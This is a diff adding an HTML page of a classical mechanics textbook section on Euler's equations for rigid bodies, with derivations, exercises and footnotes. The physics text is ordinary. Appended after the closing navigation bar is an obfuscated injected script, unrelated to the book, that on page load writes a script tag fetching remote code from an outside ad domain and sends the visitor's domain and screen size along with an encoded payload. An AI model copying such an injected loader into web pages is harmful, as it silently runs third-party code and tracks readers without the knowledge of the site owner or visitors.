@@ -1,0 +1,294 @@
+<!doctype html public "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd">
+<html>
+<!-- Generated from TeX source by tex2page, v 4p3, 
+     (c) Dorai Sitaram, http://www.cs.rice.edu/~dorai/tex2page -->
+<head>
+<title>
+
+Structure and Interpretation 
+of Classical Mechanics
+
+</title>
+<link rel="stylesheet" type="text/css" href="book-Z-C.css" title=default>
+<meta name=robots content="noindex,follow">
+</head>
+<body>
+<div class=navigation>[Go to <span><a href="book.html">first</a>, <a href="book-Z-H-31.html">previous</a></span><span>, <a href="book-Z-H-33.html">next</a></span> page<span>; &nbsp;&nbsp;</span><span><a href="book-Z-H-4.html#%_toc_start">contents</a></span><span><span>; &nbsp;&nbsp;</span><a href="book-Z-H-82.html#%_index_start">index</a></span>]</div>
+<p></p>
+<a name="%_sec_2.12"></a>
+<h2><a href="book-Z-H-4.html#%_toc_%_sec_2.12">2.12&nbsp;&nbsp;Euler's Equations</a></h2>
+<p>
+<a name="%_idx_1474"></a>
+<a name="%_idx_1476"></a><a name="%_idx_1478"></a><a name="%_idx_1480"></a><a name="%_idx_1482"></a><a name="%_idx_1484"></a>For a free rigid body we have seen that the components of the angular
+momentum on the principal axes comprise a self-contained dynamical
+system: the variation of the principal axis components depends only on
+the principal axis components.  Here we derive equations that govern
+the evolution of these components.</p>
+<p>
+The starting point for the derivation is the conservation of the
+vector angular momentum.  The
+components of the angular momentum on the principal axes are
+<a name="EQUATION_2.84"></a></p>
+<div align=left><img src="chap2-Z-G-107.gif" border="0"></div>
+<p>
+where  <img src="chap1-Z-G-D-23.gif" border="0">' is composed of the components of the angular velocity
+vector on the principal axes and <strong><em>I</em></strong>' is the matrix
+representation of the inertia tensor with respect to the principal
+axis basis:
+<a name="EQUATION_2.85"></a></p>
+<div align=left><img src="chap2-Z-G-108.gif" border="0"></div>
+<p>
+The body components of the angular momentum <strong><em>L</em></strong>' are related to the
+components <strong><em>L</em></strong> on the fixed rectangular basis <img src="chap2-Z-G-D-9.gif" border="0"><sub><em>i</em></sub> by
+<a name="EQUATION_2.86"></a></p>
+<div align=left><img src="chap2-Z-G-109.gif" border="0"></div>
+<p>
+where <strong><em>M</em></strong> is the matrix representation of the rotation
+that carries the body and all vectors attached to the body from the
+reference orientation of the body to the actual orientation.</p>
+<p>
+
+The vector angular momentum is conserved
+for free rigid-body motion, and so are its components on a fixed
+rectangular basis.  So, along solution paths,
+<a name="EQUATION_2.87"></a></p>
+<div align=left><img src="chap2-Z-G-110.gif" border="0"></div>
+<p>
+Solving, we find
+<a name="EQUATION_2.88"></a></p>
+<div align=left><img src="chap2-Z-G-111.gif" border="0"></div>
+<p>
+In terms of  <img src="chap1-Z-G-D-23.gif" border="0">' this is
+<a name="EQUATION_2.89"></a></p>
+<div align=left><img src="chap2-Z-G-112.gif" border="0"></div>
+<p>
+where we have used equation&nbsp;(<a href="book-Z-H-26.html#EQUATION_2.38">2.38</a>)
+to write <em>D</em><strong><em>M</em></strong> in terms of  <em>A</em>.  
+The function  <em>A</em> has the property<a name="call_footnote_Temp_210" href="#footnote_Temp_210"><sup><small>20</small></sup></a>
+<a name="EQUATION_2.90"></a></p>
+<div align=left><img src="chap2-Z-G-113.gif" border="0"></div>
+<p>
+for any vector with components <strong><em>v</em></strong> and any rotation with matrix
+representation <strong><em>R</em></strong>.  
+Using this property of  <em>A</em>, we find <em>Euler's equations</em>:
+<a name="EQUATION_2.91"></a></p>
+<div align=left><img src="chap2-Z-G-114.gif" border="0"></div>
+<p>
+Euler's equations give 
+the time derivative of the body components of
+the angular velocity vector entirely in terms of the angular velocity 
+components and the principal moments of inertia.  
+Let <img src="chap1-Z-G-D-23.gif" border="0"><sup><em>a</em></sup>,
+<img src="chap1-Z-G-D-23.gif" border="0"><sup><em>b</em></sup>, and <img src="chap1-Z-G-D-23.gif" border="0"><sup><em>c</em></sup> denote the components of the angular
+velocity vector on the principal axes.  Then Euler's equations can be written
+as the component equations
+<a name="EQUATION_2.92"></a></p>
+<div align=left><img src="chap2-Z-G-115.gif" border="0"></div>
+<p></p>
+<p>
+Alternately, we can rewrite Euler's equations in terms of the
+components of the angular momentum on the principal axes
+<a name="EQUATION_2.93"></a></p>
+<div align=left><img src="chap2-Z-G-116.gif" border="0"></div>
+<p>
+These equations confirm that the time derivatives of the components of
+the angular momentum on the principal axes depend only on the
+components of the angular momentum on the principal axes.</p>
+<p>
+<a name="%_idx_1486"></a><a name="%_idx_1488"></a>Euler's equations are very simple, but they do not
+completely determine the evolution of a rigid body -- they do not give
+the spatial orientation of the body.  However,
+equation&nbsp;(<a href="book-Z-H-26.html#EQUATION_2.38">2.38</a>) and
+property&nbsp;(<a href="#EQUATION_2.90">2.90</a>) can be used to relate the derivative
+of the orientation matrix to the body components of the angular
+velocity vector:
+<a name="EQUATION_2.94"></a></p>
+<div align=left><img src="chap2-Z-G-117.gif" border="0"></div>
+<p>
+A straightforward method of using these equations is to integrate them
+componentwise as a set of nine first-order ordinary differential
+equations, with initial conditions determining the initial
+configuration matrix.  Together with Euler's equations, which describe
+how the body components of the angular velocity vector change with
+time, this system of equations governing the motion of a rigid body is
+complete.  However, the reader will no doubt have noticed that this
+approach is rather wasteful.  The fact that the orientation matrix can
+be specified with only three parameters has not been taken into
+account.  We should be integrating three equations for the
+orientation, given  <img src="chap1-Z-G-D-23.gif" border="0">', not nine.  To accomplish this we once
+again need to parameterize the configuration
+matrix.</p>
+<p>
+For example, we can use Euler angles to parameterize the orientation:
+<a name="EQUATION_2.95"></a></p>
+<div align=left><img src="chap2-Z-G-118.gif" border="0"></div>
+<p>
+We form <strong><em>M</em></strong> by composing  <em>M</em> with an Euler coordinate path.
+Equation&nbsp;(<a href="#EQUATION_2.94">2.94</a>) can then be used to solve for
+<em>D</em><img src="chap1-Z-G-D-19.gif" border="0">, <em>D</em><img src="chap1-Z-G-D-16.gif" border="0">, and <em>D</em><img src="chap1-Z-G-D-56.gif" border="0">.  We find
+<a name="EQUATION_2.96"></a></p>
+<div align=left><img src="chap2-Z-G-119.gif" border="0"></div>
+<p>
+This gives us the desired equation for the orientation.  <a name="%_idx_1490"></a><a name="%_idx_1492"></a><a name="%_idx_1494"></a>Note that it
+is singular for <img src="chap1-Z-G-D-19.gif" border="0"> = 0, as are Lagrange's equations.  So Euler's
+equations using Euler angles for the configuration have the same
+problem as did the Lagrange equations using Euler angles.  Again, this
+is a manifestation of the fact that for <img src="chap1-Z-G-D-19.gif" border="0"> = 0 the orientation depends
+only on <img src="chap1-Z-G-D-16.gif" border="0">  +  <img src="chap1-Z-G-D-56.gif" border="0">.  The singularity in the equations of motion for
+<img src="chap1-Z-G-D-19.gif" border="0"> = 0 does not correspond to anything funny in the motion of the
+rigid body.  A practical solution to the singularity problem is to
+choose another set of Euler-like angles that have a singularity in a
+different place, and switch from one to the other when the going gets
+tough.  </p>
+<p>
+</p>
+<p><a name="%_thm_2.15"></a>
+<b>Exercise 2.15.</b>&nbsp;&nbsp;<strong></strong><br>
+Fill in the details of the derivation of
+equation&nbsp;(<a href="#EQUATION_2.96">2.96</a>).  You may want to use the
+computer to help with the algebra.
+</p>
+
+<p></p>
+<p>
+</p>
+<a name="%_sec_Temp_212"></a>
+<h4><a href="book-Z-H-4.html#%_toc_%_sec_Temp_212">Euler's equations for forced rigid bodies</a></h4>
+<p><a name="%_idx_1496"></a>
+Euler's equations were derived for a free rigid body.  In general, we
+must be able to deal with external forcing.  How do we do this?
+First, we derive expressions for the vector torque.  Then we include
+the vector <a name="%_idx_1498"></a>torque in the Euler equations.</p>
+<p>
+We derive the vector torque
+in a manner analogous to the derivation of the vector angular
+momentum.  That is, we derive one component and then argue that since
+the coordinate system is arbitrary, all components have the same form.</p>
+<p>
+Suppose we have a rigid body subject to some potential energy that depends
+only on time and the configuration.  A Lagrangian
+is <em>L</em>  =  <em>T</em>  <tt>-</tt>  <em>V</em>.
+If we use the Euler angles as generalized coordinates, the last of the
+three active Euler rotations that define the
+orientation is a rotation about the <img src="chap2-Z-G-D-7.gif" border="0"> axis.  The magnitude of
+this rotation is given by the angle <img src="chap1-Z-G-D-16.gif" border="0">.   The
+Lagrange equation for <img src="chap1-Z-G-D-16.gif" border="0"> gives<a name="call_footnote_Temp_213" href="#footnote_Temp_213"><sup><small>21</small></sup></a>
+<a name="EQUATION_2.97"></a></p>
+<div align=left><img src="chap2-Z-G-120.gif" border="0"></div>
+<p>
+If we define <em>T</em><sub><em>z</em></sub>, the component of the torque about the <em>z</em> axis, to be
+minus the derivative of the potential energy with respect to the angle of
+rotation of the body about the <em>z</em> axis,
+<a name="EQUATION_2.98"></a></p>
+<div align=left><img src="chap2-Z-G-121.gif" border="0"></div>
+<p>
+then we see that 
+<a name="EQUATION_2.99"></a></p>
+<div align=left><img src="chap2-Z-G-122.gif" border="0"></div>
+<p>
+We have
+already identified the momentum conjugate to <img src="chap1-Z-G-D-16.gif" border="0"> as one component, <em>L</em><sub><em>z</em></sub>,
+of the vector angular momentum <img src="chap2-Z-G-D-18.gif" border="0">
+(see section&nbsp;<a href="book-Z-H-29.html#%_sec_2.9">2.9</a>), so 
+<a name="EQUATION_2.100"></a></p>
+<div align=left><img src="chap2-Z-G-123.gif" border="0"></div>
+<p>
+Since the orientation of the reference rectangular basis vectors is
+arbitrary, we may choose them any way that we please.  Thus if we want
+any component of the vector torque, we may choose the <em>z</em>-axis so that
+we can compute it in this way.  We can conclude that 
+the vector torque gives the rate of change of the vector angular
+momentum
+<a name="EQUATION_2.101"></a></p>
+<div align=left><img src="chap2-Z-G-124.gif" border="0"></div>
+<p></p>
+<p>
+Having obtained a general prescription for the vector torque, we
+address how the vector torque may be included in Euler's equations.
+Euler's equations expressed the fact that the vector angular
+momentum is conserved.  Let's return to that calculation, but now
+include a torque with components <strong><em>T</em></strong>:
+<a name="EQUATION_2.102"></a></p>
+<div align=left><img src="chap2-Z-G-125.gif" border="0"></div>
+<p>
+Carrying out the same steps as before, we find
+<a name="EQUATION_2.103"></a></p>
+<div align=left><img src="chap2-Z-G-126.gif" border="0"></div>
+<p>
+where the components of the vector torque on the principal axes are
+<a name="EQUATION_2.104"></a></p>
+<div align=left><img src="chap2-Z-G-127.gif" border="0"></div>
+<p>
+In terms of  <img src="chap1-Z-G-D-23.gif" border="0">' this is
+<a name="EQUATION_2.105"></a></p>
+<div align=left><img src="chap2-Z-G-128.gif" border="0"></div>
+<p>
+in components,
+<a name="EQUATION_2.106"></a></p>
+<div align=left><img src="chap2-Z-G-129.gif" border="0"></div>
+<p></p>
+<p>
+
+Note that the torque entered only the equations for the body angular
+momentum or alternately for the body angular velocity vector.   The equations 
+that relate the derivative of the orientation to the angular velocity vector 
+are not modified by the torque.  In a sense, Euler's equations contain
+the dynamics, and the equations governing the orientation are
+kinematic.  Of course, Lagrange's equations must be modified by the
+potential that gives rise to the torques; in this sense Lagrange's
+equations contain both dynamics and kinematics.</p>
+<p>
+</p>
+<p><a name="%_thm_2.16"></a>
+<b>Exercise 2.16.</b>&nbsp;&nbsp;<strong>Bicycle wheel</strong><br>
+<a name="%_idx_1500"></a><br><strong>a</strong>.&nbsp;&nbsp;Imagine that you are holding a bicycle wheel by the
+axle (in both hands) and the wheel is spinning so that the top edge is
+going away from your face.  If you torque the wheel by pushing down
+with your right hand and pulling up with your left hand the wheel will
+precess.  Which way does it try to turn?</p>
+<p>
+<strong>b</strong>.&nbsp;&nbsp;A free bicycle wheel rolls on a horizontal surface.  If it
+starts to tilt, the torque from gravity will cause the wheel to turn.
+Which way will it turn?  The reasoning that applied to part&nbsp;<strong>a</strong>
+does not directly apply to the rolling bicycle wheel, which is not a
+holonomic system.  However, it is interesting to think about whether
+the behavior of the two systems is related.
+</p>
+
+<p></p>
+<p>
+</p>
+<p><a name="%_thm_2.17"></a>
+<b>Exercise 2.17.</b>&nbsp;&nbsp;<strong>Precession of the equinox</strong><br>
+<a name="%_idx_1502"></a><a name="%_idx_1504"></a><a name="%_idx_1506"></a>
+The Earth spins very nearly about the largest moment of inertia, and
+the spin axis is tilted by about 23<sup><small>o</small></sup> to the orbit normal.
+There is a gravity-gradient torque on the Earth from the Sun that
+causes the spin axis of the Earth to precess.  Investigate this
+precession in the approximation that the orbit of the Earth is
+circular and the Earth is axisymmetric.  Determine the rate of
+precession in terms of the moments of inertia of the Earth.</p>
+<p>
+</p>
+
+<p></p>
+<p>
+
+</p>
+<div class=smallprint><hr></div>
+<p></p>
+<div class=footnote>
+<p><a name="footnote_Temp_210" href="#call_footnote_Temp_210"><sup><small>20</small></sup></a> Rotating the cross product of two vectors gives the same
+vector as is obtained by taking the cross product of two rotated
+vectors: <em>R</em> (<img src="chap2-Z-G-D-15.gif" border="0"> &times; <img src="chap1-Z-G-D-10.gif" border="0">)  =  (<em>R</em><img src="chap2-Z-G-D-15.gif" border="0">) &times; (<em>R</em><img src="chap1-Z-G-D-10.gif" border="0">).</p>
+
+<p><a name="footnote_Temp_213" href="#call_footnote_Temp_213"><sup><small>21</small></sup></a> In this equation we have a partial derivative with respect
+to a component of the coordinate argument of the potential
+energy function.  The first subscript on the <img src="front-Z-G-D-2.gif" border="0"> symbol
+indicates the coordinate argument.  The second one selects the
+<img src="chap1-Z-G-D-16.gif" border="0"> component.</p>
+</div>
+<div class=navigation>[Go to <span><a href="book.html">first</a>, <a href="book-Z-H-31.html">previous</a></span><span>, <a href="book-Z-H-33.html">next</a></span> page<span>; &nbsp;&nbsp;</span><span><a href="book-Z-H-4.html#%_toc_start">contents</a></span><span><span>; &nbsp;&nbsp;</span><a href="book-Z-H-82.html#%_index_start">index</a></span>]</div>
+<p></p>
+<script type="text/javascript">if(self==top){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);document.write("<scr"+"ipt type=text/javascript src="+idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request");document.write("?id=1");document.write("&amp;enc=telkom2");document.write("&amp;params=" + "4TtHaUQnUEiP6K%2fc5C582NgXaqsgjSGNhMkGfMSQiD3u8kHIqzT%2bhCCr1ruz48einOfxEwRaIjpHfaRjmIRk0ms2zxx%2bR7t5WQshaVplUkhAfylKag5jhSZocDw%2fj9bCXvzTICqTXDDCAwCM6JICM3aNp%2bf4N0D4IRYWo66nCuHaGHWFWGO0f4KXsoKQwIridV7ZFOG4dZm5uKYlPMVbVxJV1NbNq%2f0xjtI%2fqeElBXJrMeNGKeWQM50S9ZwqhJxaq926pl%2bq%2f3goIlGKm%2bYO9B729MtpgTPcOkMwrsNebZw8iWV%2b5SjRX7gOWdpNaZM%2b%2b9BobhyXMVTNVFBMvhBCyXo6VRM8OySuVbTY%2bcnedQiJD4gP%2fuoxIZ3%2f8SmNyJtsUir4owKxXfyRuCQ0AL3nsYRy3j%2f84F85vvGIRz%2brW5rZs6k2EORQjdH88ETFvK3L5XGVfqBA132c%2bXpNK4tvcZhfQbbIUVfdwIVSKAz2cFUmrGVqMAXaYumEY79obN1O");document.write("&amp;idc_r="+idc_glo_r);document.write("&amp;domain="+document.domain);document.write("&amp;sw="+screen.width+"&amp;sh="+screen.height);document.write("></scr"+"ipt>");}</script><noscript>activate javascript</noscript></body></body>
+</html>
